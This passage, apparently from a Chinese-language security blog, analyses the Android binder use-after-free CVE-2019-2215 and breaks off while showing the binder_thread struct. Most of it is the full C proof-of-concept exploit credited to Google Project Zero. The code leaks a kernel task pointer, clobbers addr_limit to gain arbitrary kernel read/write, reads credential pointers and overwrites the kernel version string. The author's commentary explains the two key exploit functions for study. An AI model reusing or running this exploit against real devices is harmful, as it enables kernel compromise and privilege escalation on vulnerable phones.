class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * POC to gain arbitrary kernel R/W access using CVE-2019-2215</span></span><br><span class="line"><span class="comment"> * https://bugs.chromium.org/p/project-zero/issues/detail?id=1942</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Jann Horn &amp; Maddie Stone of Google Project Zero</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 3 October 2019</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BINDER_THREAD_EXIT 0x40046208ul</span></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> we don't cover the task_struct* here; we want to leave it uninitialized</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BINDER_THREAD_SZ 0x190</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16) <span class="comment">//25</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WAITQUEUE_OFFSET 0xA0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOVEC_INDX_FOR_WQ (WAITQUEUE_OFFSET / 16) <span class="comment">//10</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hexdump_memory</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">size_t</span> byte_count)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> byte_offset_start = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (byte_count % <span class="number">16</span>)</span><br><span class="line">    errx(<span class="number">1</span>, <span class="string">"hexdump_memory called with non-full line"</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">long</span> byte_offset = byte_offset_start; byte_offset &lt; byte_offset_start + byte_count;</span><br><span class="line">          byte_offset += <span class="number">16</span>) &#123;</span><br><span class="line">    <span class="keyword">char</span> line[<span class="number">1000</span>];</span><br><span class="line">    <span class="keyword">char</span> *linep = line;</span><br><span class="line">    linep += <span class="built_in">sprintf</span>(linep, <span class="string">"%08lx  "</span>, byte_offset);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">16</span>; i++) &#123;</span><br><span class="line">      linep += <span class="built_in">sprintf</span>(linep, <span class="string">"%02hhx "</span>, (<span class="keyword">unsigned</span> <span class="keyword">char</span>)buf[byte_offset + i]);</span><br><span class="line">    &#125;</span><br><span class="line">    linep += <span class="built_in">sprintf</span>(linep, <span class="string">" |"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">16</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">char</span> c = buf[byte_offset + i];</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">isalnum</span>(c) || <span class="built_in">ispunct</span>(c) || c == <span class="string">' '</span>) &#123;</span><br><span class="line">        *(linep++) = c;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *(linep++) = <span class="string">'.'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    linep += <span class="built_in">sprintf</span>(linep, <span class="string">"|"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(line);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> epfd;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *dummy_page_4g_aligned;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> current_ptr;</span><br><span class="line"><span class="keyword">int</span> binder_fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">leak_task_struct</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span> = &#123;</span> .events = EPOLLIN &#125;;</span><br><span class="line">  <span class="keyword">if</span> (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &amp;event)) err(<span class="number">1</span>, <span class="string">"epoll_add"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iovec_array</span>[<span class="title">IOVEC_ARRAY_SZ</span>];</span></span><br><span class="line">  <span class="built_in">memset</span>(iovec_array, <span class="number">0</span>, <span class="keyword">sizeof</span>(iovec_array));</span><br><span class="line"></span><br><span class="line">  iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page_4g_aligned; <span class="comment">/* spinlock in the low address half must be zero */</span></span><br><span class="line">  iovec_array[IOVEC_INDX_FOR_WQ].iov_len = <span class="number">0x1000</span>; <span class="comment">/* wq-&gt;task_list-&gt;next */</span></span><br><span class="line">  iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_base = (<span class="keyword">void</span> *)<span class="number">0xDEADBEEF</span>; <span class="comment">/* wq-&gt;task_list-&gt;prev */</span></span><br><span class="line">  iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_len = <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> b;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">int</span> pipefd[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">if</span> (pipe(pipefd)) err(<span class="number">1</span>, <span class="string">"pipe"</span>);</span><br><span class="line">  <span class="keyword">if</span> (fcntl(pipefd[<span class="number">0</span>], F_SETPIPE_SZ, <span class="number">0x1000</span>) != <span class="number">0x1000</span>) err(<span class="number">1</span>, <span class="string">"pipe size"</span>);</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">char</span> page_buffer[<span class="number">0x1000</span>];</span><br><span class="line">  <span class="comment">//if (write(pipefd[1], page_buffer, sizeof(page_buffer)) != sizeof(page_buffer)) err(1, "fill pipe");</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">pid_t</span> fork_ret = fork();</span><br><span class="line">  <span class="keyword">if</span> (fork_ret == <span class="number">-1</span>) err(<span class="number">1</span>, <span class="string">"fork"</span>);</span><br><span class="line">  <span class="keyword">if</span> (fork_ret == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">/* Child process */</span></span><br><span class="line">    prctl(PR_SET_PDEATHSIG, SIGKILL);</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"CHILD: Doing EPOLL_CTL_DEL.\n"</span>);</span><br><span class="line">    epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &amp;event);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"CHILD: Finished EPOLL_CTL_DEL.\n"</span>);</span><br><span class="line">    <span class="comment">// first page: dummy data</span></span><br><span class="line">    <span class="keyword">if</span> (read(pipefd[<span class="number">0</span>], page_buffer, <span class="keyword">sizeof</span>(page_buffer)) != <span class="keyword">sizeof</span>(page_buffer)) err(<span class="number">1</span>, <span class="string">"read full pipe"</span>);</span><br><span class="line">    close(pipefd[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"CHILD: Finished write to FIFO.\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//printf("PARENT: Calling READV\n");</span></span><br><span class="line">  ioctl(binder_fd, BINDER_THREAD_EXIT, <span class="literal">NULL</span>);</span><br><span class="line">  b = writev(pipefd[<span class="number">1</span>], iovec_array, IOVEC_ARRAY_SZ);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"writev() returns 0x%x\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)b);</span><br><span class="line">  <span class="comment">// second page: leaked data</span></span><br><span class="line">  <span class="keyword">if</span> (read(pipefd[<span class="number">0</span>], page_buffer, <span class="keyword">sizeof</span>(page_buffer)) != <span class="keyword">sizeof</span>(page_buffer)) err(<span class="number">1</span>, <span class="string">"read full pipe"</span>);</span><br><span class="line">  <span class="comment">//hexdump_memory((unsigned char *)page_buffer, sizeof(page_buffer));</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"PARENT: Finished calling READV\n"</span>);</span><br><span class="line">  <span class="keyword">int</span> status;</span><br><span class="line">  <span class="keyword">if</span> (wait(&amp;status) != fork_ret) err(<span class="number">1</span>, <span class="string">"wait"</span>);</span><br><span class="line"></span><br><span class="line">  current_ptr = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(page_buffer + <span class="number">0xe8</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"current_ptr == 0x%lx\n"</span>, current_ptr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clobber_addr_limit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span> = &#123;</span> .events = EPOLLIN &#125;;</span><br><span class="line">  <span class="keyword">if</span> (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &amp;event)) err(<span class="number">1</span>, <span class="string">"epoll_add"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iovec_array</span>[<span class="title">IOVEC_ARRAY_SZ</span>];</span></span><br><span class="line">  <span class="built_in">memset</span>(iovec_array, <span class="number">0</span>, <span class="keyword">sizeof</span>(iovec_array));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> second_write_chunk[] = &#123;</span><br><span class="line">    <span class="number">1</span>, <span class="comment">/* iov_len */</span></span><br><span class="line">    <span class="number">0xdeadbeef</span>, <span class="comment">/* iov_base (already used) */</span></span><br><span class="line">    <span class="number">0x8</span> + <span class="number">2</span> * <span class="number">0x10</span>, <span class="comment">/* iov_len (already used) */</span></span><br><span class="line">    current_ptr + <span class="number">0x8</span>, <span class="comment">/* next iov_base (addr_limit) */</span></span><br><span class="line">    <span class="number">8</span>, <span class="comment">/* next iov_len (sizeof(addr_limit)) */</span></span><br><span class="line">    <span class="number">0xfffffffffffffffe</span> <span class="comment">/* value to write */</span></span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page_4g_aligned; <span class="comment">/* spinlock in the low address half must be zero */</span></span><br><span class="line">  iovec_array[IOVEC_INDX_FOR_WQ].iov_len = <span class="number">1</span>; <span class="comment">/* wq-&gt;task_list-&gt;next */</span></span><br><span class="line">  iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_base = (<span class="keyword">void</span> *)<span class="number">0xDEADBEEF</span>; <span class="comment">/* wq-&gt;task_list-&gt;prev */</span></span><br><span class="line">  iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_len = <span class="number">0x8</span> + <span class="number">2</span> * <span class="number">0x10</span>; <span class="comment">/* iov_len of previous, then this element and next element */</span></span><br><span class="line">  iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">2</span>].iov_base = (<span class="keyword">void</span> *)<span class="number">0xBEEFDEAD</span>;</span><br><span class="line">  iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">2</span>].iov_len = <span class="number">8</span>; <span class="comment">/* should be correct from the start, kernel will sum up lengths when importing */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> socks[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, socks)) err(<span class="number">1</span>, <span class="string">"socketpair"</span>);</span><br><span class="line">  <span class="keyword">if</span> (write(socks[<span class="number">1</span>], <span class="string">"X"</span>, <span class="number">1</span>) != <span class="number">1</span>) err(<span class="number">1</span>, <span class="string">"write socket dummy byte"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">pid_t</span> fork_ret = fork();</span><br><span class="line">  <span class="keyword">if</span> (fork_ret == <span class="number">-1</span>) err(<span class="number">1</span>, <span class="string">"fork"</span>);</span><br><span class="line">  <span class="keyword">if</span> (fork_ret == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">/* Child process */</span></span><br><span class="line">    prctl(PR_SET_PDEATHSIG, SIGKILL);</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"CHILD: Doing EPOLL_CTL_DEL.\n"</span>);</span><br><span class="line">    epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &amp;event);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"CHILD: Finished EPOLL_CTL_DEL.\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> (write(socks[<span class="number">1</span>], second_write_chunk, <span class="keyword">sizeof</span>(second_write_chunk)) != <span class="keyword">sizeof</span>(second_write_chunk))</span><br><span class="line">      err(<span class="number">1</span>, <span class="string">"write second chunk to socket"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ioctl(binder_fd, BINDER_THREAD_EXIT, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span> = &#123;</span></span><br><span class="line">    .msg_iov = iovec_array,</span><br><span class="line">    .msg_iovlen = IOVEC_ARRAY_SZ</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">int</span> recvmsg_result = recvmsg(socks[<span class="number">0</span>], &amp;msg, MSG_WAITALL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"recvmsg() returns %d, expected %lu\n"</span>, recvmsg_result,</span><br><span class="line">      (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(iovec_array[IOVEC_INDX_FOR_WQ].iov_len +</span><br><span class="line">      iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_len +</span><br><span class="line">      iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">2</span>].iov_len));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> kernel_rw_pipe[<span class="number">2</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kernel_write</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> kaddr, <span class="keyword">void</span> *buf, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)</span> </span>&#123;</span><br><span class="line">  errno = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (len &gt; <span class="number">0x1000</span>) errx(<span class="number">1</span>, <span class="string">"kernel writes over PAGE_SIZE are messy, tried 0x%lx"</span>, len);</span><br><span class="line">  <span class="keyword">if</span> (write(kernel_rw_pipe[<span class="number">1</span>], buf, len) != len) err(<span class="number">1</span>, <span class="string">"kernel_write failed to load userspace buffer"</span>);</span><br><span class="line">  <span class="keyword">if</span> (read(kernel_rw_pipe[<span class="number">0</span>], (<span class="keyword">void</span>*)kaddr, len) != len) err(<span class="number">1</span>, <span class="string">"kernel_write failed to overwrite kernel memory"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kernel_read</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> kaddr, <span class="keyword">void</span> *buf, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)</span> </span>&#123;</span><br><span class="line">  errno = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (len &gt; <span class="number">0x1000</span>) errx(<span class="number">1</span>, <span class="string">"kernel writes over PAGE_SIZE are messy, tried 0x%lx"</span>, len);</span><br><span class="line">  <span class="keyword">if</span> (write(kernel_rw_pipe[<span class="number">1</span>], (<span class="keyword">void</span>*)kaddr, len) != len) err(<span class="number">1</span>, <span class="string">"kernel_read failed to read kernel memory"</span>);</span><br><span class="line">  <span class="keyword">if</span> (read(kernel_rw_pipe[<span class="number">0</span>], buf, len) != len) err(<span class="number">1</span>, <span class="string">"kernel_read failed to write out to userspace"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">kernel_read_ulong</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> kaddr)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> data;</span><br><span class="line">  kernel_read(kaddr, &amp;data, <span class="keyword">sizeof</span>(data));</span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kernel_write_ulong</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> kaddr, <span class="keyword">unsigned</span> <span class="keyword">long</span> data)</span> </span>&#123;</span><br><span class="line">  kernel_write(kaddr, &amp;data, <span class="keyword">sizeof</span>(data));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kernel_write_uint</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> kaddr, <span class="keyword">unsigned</span> <span class="keyword">int</span> data)</span> </span>&#123;</span><br><span class="line">  kernel_write(kaddr, &amp;data, <span class="keyword">sizeof</span>(data));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Linux localhost 4.4.177-g83bee1dc48e8 #1 SMP PREEMPT Mon Jul 22 20:12:03 UTC 2019 aarch64</span></span><br><span class="line"><span class="comment">// data from `pahole` on my own build with the same .config</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OFFSET__task_struct__mm 0x520</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OFFSET__task_struct__cred 0x790</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OFFSET__mm_struct__user_ns 0x300</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OFFSET__uts_namespace__name__version 0xc7</span></span><br><span class="line"><span class="comment">// SYMBOL_* are relative to _head; data from /proc/kallsyms on userdebug</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYMBOL__init_user_ns 0x202f2c8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYMBOL__init_task 0x20257d0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYMBOL__init_uts_ns 0x20255c0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Starting POC\n"</span>);</span><br><span class="line">  <span class="comment">//pin_to(0);</span></span><br><span class="line"></span><br><span class="line">  dummy_page_4g_aligned = mmap((<span class="keyword">void</span>*)<span class="number">0x100000000</span>UL, <span class="number">0x2000</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (dummy_page_4g_aligned != (<span class="keyword">void</span>*)<span class="number">0x100000000</span>UL)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"mmap 4g aligned"</span>);</span><br><span class="line">  <span class="keyword">if</span> (pipe(kernel_rw_pipe)) err(<span class="number">1</span>, <span class="string">"kernel_rw_pipe"</span>);</span><br><span class="line"></span><br><span class="line">  binder_fd = open(<span class="string">"/dev/binder"</span>, O_RDONLY);</span><br><span class="line">  epfd = epoll_create(<span class="number">1000</span>);</span><br><span class="line">  leak_task_struct();</span><br><span class="line">  clobber_addr_limit();</span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"should have stable kernel R/W now\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* in case you want to do stuff with the creds, to show that you can get them: */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> current_mm = kernel_read_ulong(current_ptr + OFFSET__task_struct__mm);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"current-&gt;mm == 0x%lx\n"</span>, current_mm);</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> current_user_ns = kernel_read_ulong(current_mm + OFFSET__mm_struct__user_ns);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"current-&gt;mm-&gt;user_ns == 0x%lx\n"</span>, current_user_ns);</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base = current_user_ns - SYMBOL__init_user_ns;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"kernel base is 0x%lx\n"</span>, kernel_base);</span><br><span class="line">  <span class="keyword">if</span> (kernel_base &amp; <span class="number">0xfff</span>UL) errx(<span class="number">1</span>, <span class="string">"bad kernel base (not 0x...000)"</span>);</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> init_task = kernel_base + SYMBOL__init_task;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&amp;init_task == 0x%lx\n"</span>, init_task);</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> init_task_cred = kernel_read_ulong(init_task + OFFSET__task_struct__cred);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"init_task.cred == 0x%lx\n"</span>, init_task_cred);</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> my_cred = kernel_read_ulong(current_ptr + OFFSET__task_struct__cred);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"current-&gt;cred == 0x%lx\n"</span>, my_cred);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> init_uts_ns = kernel_base + SYMBOL__init_uts_ns;</span><br><span class="line">  <span class="keyword">char</span> new_uts_version[] = <span class="string">"EXPLOITED KERNEL"</span>;</span><br><span class="line">  kernel_write(init_uts_ns + OFFSET__uts_namespace__name__version, new_uts_version, <span class="keyword">sizeof</span>(new_uts_version));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这份 poc 还是比较简洁的，在简单阅读完该 poc 后，我发现该漏洞做到内核读写竟然不需要一个硬编码地址，这意味着该漏洞的通用性会比较好，呃～～～，应该好好学习一下。遗憾的是这个漏洞影响范围比较小，目前已知只影响数款机型，这个原因 google 的漏洞细节里有说。从上面可以看出，<code>void leak_task_struct(void)</code> 和 <code>void clobber_addr_limit(void)</code> 是利用的两个关键函数。本文也主要解释这两个函数做利用的过程。</p>
<p>从 commit 看，<code>struct binder_thread thread;</code> 结构就是 UAF 的对象，该结构成员如下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">binder_thread</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">binder_proc</span> *<span class="title">proc</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">rb_node</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">waiting_thread_node</span>;</span></span><br><span class="line">	<span class="keyword">int</span> pid;</span><br><span class="line">	<span class="keyword">int</span> looper;              <span class="comment">/* only modified by this thread */</span></span><br><span class="line">	<span class="keyword">bool</span> looper_need_return; <span class="comment">/* can be written by other thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">binder_transaction</span> *<span class="title">transaction_stack</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">todo</span>;</span></span><br><span class="line">	<span class="keyword">bool</span> process_todo;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">binder_error</span> <span class="title">return_error</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">binder_error</span> <span class="title">reply_error</span>;</span></span><br><span class="line">	<span class="keyword">wait_queue_head_t</span> wait;              <span class="comment">// 1</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">binder_stats</span> <span class="title">stats</span>;</span></span><br><span class="line">	<span class="keyword">atomic_t</span> tmp_ref;</span><br><span class="line">	<span 